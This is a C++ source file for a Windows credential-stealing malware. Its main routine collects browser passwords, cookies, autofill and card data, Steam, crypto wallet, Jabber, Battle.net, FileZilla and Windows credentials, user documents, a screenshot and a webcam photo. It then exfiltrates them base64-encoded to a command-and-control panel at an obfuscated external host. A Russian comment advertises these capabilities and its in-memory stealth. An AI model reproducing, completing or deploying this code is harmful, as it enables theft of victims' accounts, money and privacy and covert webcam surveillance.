#include <windows.h>
#include <shlwapi.h>
#include <wininet.h>
#include <stdint.h>
#include "Vector.h"
#include "Zip.h"
#include "Array.h"
#include "DevApi.h"
#include "IEImpl.h"
#include "Parsers.h"
#include "WinCred.h"
#include "SqlHandler.h"
#include "FileStealer.h"
#include "obfuscator.hpp"
#include "CModule.h"

//#pragma comment(linker, "/MERGE:.data=.text")
//#pragma comment(linker, "/MERGE:.rdata=.text")
//#pragma comment(linker, "/SECTION:.text,EWR")

unsigned long len;
void* buf;

void necroSend(PCSTR GetLink, PCSTR Logs, SIZE_T LogsSize) {//here you can change panel address
	SIZE_T outsize;
	LPCSTR param = custom_base64Encode((LPBYTE)Logs, LogsSize, &outsize);

	CHAR* szReq = (CHAR*)malloc(outsize + 6);
	wnsprintfA(szReq, outsize + 6, "logs=%s", param);

	HINTERNET hIntSession = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	HINTERNET hHttpSession = InternetConnectA(hIntSession, xorstr("xmr.news"), 80, 0, 0, INTERNET_SERVICE_HTTP, 0, NULL);
	HINTERNET hHttpRequest = HttpOpenRequestA(hHttpSession, "POST", GetLink, 0, 0, 0, INTERNET_FLAG_RELOAD, 0);

	const WCHAR* szHeaders = L"Content-Type: application/x-www-form-urlencoded";
	HttpSendRequestW(hHttpRequest, szHeaders, lstrlenW(szHeaders), (CHAR*)szReq, lstrlenA(szReq));

	InternetCloseHandle(hHttpRequest);
	InternetCloseHandle(hHttpSession);
	InternetCloseHandle(hIntSession);
	free((CHAR*)param);
	free((CHAR*)szReq);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {//main

	/*
	Собирает Пароли, Куки, Формы Авто-заполнения, Кредитные карты со всех браузеров на движке Chromium на пк
	Собирает файлы для входа в Steam
	Собирает все файлы которые могут иметь отношение к крипте
	Собирает три Jabber клиента (pidgin, psi, psi+)
	Собирает .doc, .txt, .rtf файлы из %USERPROFILE%
	Собирает файлы Battle.Net
	Собирает файлы с серверами FileZilla
	Собирает все пароли из Credentials
	Делает фото рабочего стола и фото с веб камеры
	
	Работает только в памяти (создаёт файл с фоткой рабочего стола и вебкамеры на пк, но потом удаляет их)
	На ПК жерты .zip файл не будет создан, он будет собран в памяти.
	
	Красивая и удобная панель со статистикой, возможностью скачать все логи/удалить все логи/скачать отдельный лог,
	имя архива формируется по такой форме ID_IP_RANDOMSTRING.
	
	Софт написан на C++ && ASM
	Размер софта на момент создания темы 36 килобайт (36864 байт)
	
	Лог отправляет не за 1-2 секунды, но в отличие от многих аналогов
	соберает хороший лог.
	*/

	DWORD dwPasswords = 0, dwSteam = 0, dwWallet = 0, dwJabber = 0,
		  dwSomeFiles = 0, dwBattleNet = 0, dwFtp = 0, dwCredentials = 0,
		  dwAutofill = 0, dwCookies = 0, dwCards = 0, dwZipSize = 0, dwScrSize = 0;
	const char* coForm = "{ \"log\":\"%s\", \"screenshot\":\"%s\", \"passwords\":\"%ld\", \"autofill\":\"%ld\", \"cookies\":\"%ld\", \"crypto\":\"%ld\", \"steam\":\"%ld\", \"ftp\":\"%ld\", \"battlenet\":\"%ld\", \"jabber\":\"%ld\", \"cc\":\"%ld\" }";

	PCWCHAR localAppData = getEnvW(L"LOCALAPPDATA");
	HZIP hZip = CreateZip(0, 104857600, 0);

	vector LoginData, WebData, Cookies;
	vector_init(&LoginData); vector_init(&WebData); vector_init(&Cookies);

	doIExplore(hZip, &dwPasswords); doSteam(hZip, &dwSteam);
	doWallet(hZip, &dwWallet); doJabber(hZip, &dwJabber);
	doSomeFiles(hZip, &dwSomeFiles); doBattleNet(hZip, &dwBattleNet);
	doFilezilla(hZip, &dwFtp); doCredentials(hZip, &dwCredentials);
	parseChromium(localAppData, &LoginData, &WebData, &Cookies);

	for (int i = 0; i < vector_count(&LoginData); i++) {
		doChromium(hZip, (WCHAR*)vector_get(&LoginData, i), &dwPasswords, TYPE_PASSWORDS);
		free(vector_get(&LoginData, i));
	}
	for (int i = 0; i < vector_count(&Cookies); i++) {
		doChromium(hZip, (WCHAR*)vector_get(&Cookies, i), &dwCookies, TYPE_COOKIES);
		free(vector_get(&Cookies, i));
	}
	for (int i = 0; i < vector_count(&WebData); i++) {
		doChromium(hZip, (WCHAR*)vector_get(&WebData, i), &dwAutofill, TYPE_AUTOFILL);
		doChromium(hZip, (WCHAR*)vector_get(&WebData, i), &dwCards, TYPE_CREDITS);
		free(vector_get(&WebData, i));
	}
	vector_free(&LoginData); vector_free(&WebData); vector_free(&Cookies);
	
	WCHAR* tempEnvMem = (WCHAR*)getEnvW(L"TEMP");
	lstrcatW(tempEnvMem, L"\\wc.bmp");
	doWebcamera(tempEnvMem);
	ZipAdd(hZip, L"PHOTO.WebCam.bmp", tempEnvMem);
	DeleteFileW(tempEnvMem);
	free(tempEnvMem);

	DWORD dwScreenSize = 0;
	BYTE* szScreenMem = doScreenshot(&dwScreenSize);
	ZipAdd(hZip, L"PHOTO.Screen.bmp", szScreenMem, dwScreenSize);

	free(tempEnvMem);
	ZipGetMemory(hZip, &buf, &len);

	PCSTR base64EncodedZip = custom_base64Encode((LPBYTE)buf, len, &dwZipSize);//generate logs data
	PCSTR base64EncodedScreenshot = custom_base64Encode((LPBYTE)szScreenMem, dwScreenSize, &dwScrSize);//generate screenshot string
	free(szScreenMem);

	PCSTR logsMemory = (char*)malloc(180 + dwScrSize + dwZipSize);//generate logs data
	wnsprintfA((char*)logsMemory, 180 + dwScrSize + dwZipSize, coForm, base64EncodedZip, base64EncodedScreenshot,
		dwPasswords, dwAutofill, dwCookies, dwWallet, 
		dwSteam, dwFtp, dwBattleNet, dwJabber, dwCards);//generate logs data
	free((void*)base64EncodedScreenshot);
	free((void*)base64EncodedZip);

	necroSend("admin/api.php", logsMemory, lstrlenA(logsMemory));//send logs to cnc
	ExitProcess(0);//ave anime 2 :D
}